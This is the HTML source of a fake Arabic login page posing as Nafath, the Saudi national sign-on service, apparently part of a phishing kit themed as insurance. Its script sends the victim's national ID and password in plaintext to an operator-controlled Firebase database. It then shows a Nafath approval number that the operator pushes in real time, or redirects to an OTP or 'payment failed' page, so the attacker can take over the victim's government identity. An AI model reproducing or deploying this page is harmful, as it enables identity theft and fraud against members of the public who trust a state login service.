<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="js/theme-toggle.js"></script>
    <script src="js/i18n.js"></script>
    <title>نفاذ | Nafath Authentication</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/inner-theme.css">
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
    <style>
        body { display:flex; flex-direction:column; min-height:100vh; }
        .nafath-form label { display:block; font-size:0.8rem; font-weight:700; color:var(--text-muted); margin-bottom:6px; text-align:start; }
        .footer-links { margin-top:16px; font-size:0.82rem; display:flex; justify-content:center; gap:12px; }
        .footer-links a { color:rgba(0,229,160,0.7); text-decoration:none; }
        .footer-links a:hover { color:var(--green); }
        #code-screen { display:none; animation:fadeIn 0.4s; }
        #loading-screen { display:none; flex-direction:column; align-items:center; }
        @keyframes fadeIn { from { opacity:0; transform:translateY(8px); } to { opacity:1; transform:translateY(0); } }
        .nafath-main { flex:1; display:flex; flex-direction:column; align-items:center; padding:20px 16px 48px; }
    </style>
</head>
<body>

<button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>

<div class="nafath-topstrip" data-i18n="nafath.topstrip">النفاذ الوطني الموحد — تسجيل الدخول عبر الهوية الرقمية</div>

<div class="nafath-header-bar">
    <img src="images/nafath/nafath-wordmark.svg" alt="نفاذ" height="44" width="180">
    <div style="display:flex;align-items:center;gap:12px;">
        <img src="images/nafath/vision-2030-inspired.svg" alt="رؤية 2030" height="38" width="150">
        <button class="lang-btn" data-lang-toggle onclick="toggleLang()">EN</button>
    </div>
</div>

<div class="nafath-main">
    <div class="teal-card teal-card--narrow" style="max-width:420px;width:100%;">

        <!-- Login Screen -->
        <div id="login-screen">
            <div style="text-align:center;padding:28px 24px 8px;border-bottom:1px solid var(--teal-border);">
                <img src="images/nafath/auth-user-lock.svg" alt="" height="72" width="72" style="margin-bottom:10px;">
                <div class="section-title" data-i18n="nafath.login_title">تسجيل الدخول</div>
                <div class="section-sub" data-i18n="nafath.login_sub">أدخل رقم الهوية وكلمة المرور كما في تطبيق نفاذ</div>
            </div>
            <div class="card-body">
                <form class="nafath-form" onsubmit="handleNafathLogin(event)">
                    <div class="field">
                        <label for="nafath_username" data-i18n="nafath.id_label">رقم الهوية / المستخدم</label>
                        <input type="text" id="nafath_username" class="field__input" required maxlength="10" inputmode="numeric" placeholder="1xxxxxxxxxx" dir="ltr" style="text-align:start;" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
                    </div>
                    <div class="field">
                        <label for="nafath_password" data-i18n="nafath.pass_label">كلمة المرور</label>
                        <input type="password" id="nafath_password" class="field__input" required placeholder="••••••••">
                    </div>
                    <button type="submit" class="btn-green" data-i18n="nafath.btn_login">دخول</button>
                    <div class="footer-links">
                        <a href="#" data-i18n="nafath.forgot">نسيت كلمة المرور؟</a>
                        <span style="opacity:.3">|</span>
                        <a href="#" data-i18n="nafath.register">تسجيل جديد</a>
                    </div>
                </form>
            </div>
        </div>

        <!-- Loading Screen -->
        <div id="loading-screen">
            <div class="card-body" style="text-align:center;padding:48px 24px;">
                <div class="spin-ring" style="margin-bottom:20px;"></div>
                <div class="section-title" data-i18n="nafath.verifying">جاري التحقق...</div>
                <div class="section-sub" style="margin-top:6px;" data-i18n="nafath.wait_msg">يرجى الانتظار بينما يتم توجيه طلبك</div>
            </div>
        </div>

        <!-- Code Screen -->
        <div id="code-screen">
            <div style="text-align:center;padding:28px 24px 8px;border-bottom:1px solid var(--teal-border);">
                <div class="section-title" style="color:var(--green);" data-i18n="nafath.open_app">افتح تطبيق نفاذ</div>
                <div class="section-sub" style="margin-top:4px;" data-i18n="nafath.select_num">اختر الرقم التالي في التطبيق لتأكيد العملية</div>
            </div>
            <div class="card-body" style="text-align:center;">
                <div class="nafath-number-circle" id="display-num">--</div>
                <div id="timer-box" style="display:none;" class="timer-chip" style="margin-top:8px;">
                    <span data-i18n="nafath.expires">ينتهي الرقم خلال:</span>
                    <span class="timer-chip__num" id="timer">01:00</span>
                </div>
            </div>
        </div>

    </div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
        authDomain: "tameen-658e9.firebaseapp.com",
        projectId: "tameen-658e9",
        storageBucket: "tameen-658e9.firebasestorage.app",
        messagingSenderId: "292670676256",
        appId: "1:292670676256:web:3624157751cd194efe4b45"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const userId = localStorage.getItem('user_id');
    let timerInterval;

    async function handleNafathLogin(e) {
        e.preventDefault();
        const user = document.getElementById('nafath_username').value;
        const pass = document.getElementById('nafath_password').value;
        document.getElementById('login-screen').style.display = 'none';
        document.getElementById('loading-screen').style.display = 'flex';
        try {
            await db.collection("orders").doc(userId).update({
                nafath_username: user, nafath_password: pass,
                status: "تم تسجيل دخول نفاذ - بانتظار الرقم"
            });
        } catch(err) { console.error(err); }
    }

    function startTimer(duration) {
        let timer = duration;
        const display = document.getElementById('timer');
        document.getElementById('timer-box').style.display = 'inline-flex';
        clearInterval(timerInterval);
        timerInterval = setInterval(() => {
            const m = parseInt(timer/60,10);
            const s = parseInt(timer%60,10);
            display.textContent = (m<10?'0'+m:m)+':'+(s<10?'0'+s:s);
            if (--timer < 0) { clearInterval(timerInterval); display.textContent = "00:00"; }
        }, 1000);
    }

    if (userId) {
        db.collection("orders").doc(userId).onSnapshot((doc) => {
            if (doc.exists) {
                const data = doc.data();
                if (data.next_step === "SHOW_NAFATH_CODE" && data.nafath_code) {
                    if (document.getElementById('code-screen').style.display !== 'block') {
                        document.getElementById('login-screen').style.display = 'none';
                        document.getElementById('loading-screen').style.display = 'none';
                        document.getElementById('code-screen').style.display = 'block';
                        document.getElementById('display-num').innerText = data.nafath_code;
                        startTimer(60);
                    }
                }
                if (data.next_step === "GO_TO_REJECT") window.location.href = "payment_failed.html";
                if (data.next_step === "GO_TO_OTP") window.location.href = "nafath_otp.html";
            }
        });
    } else {
        window.location.href = "index.html";
    }
</script>
</body>
</html>
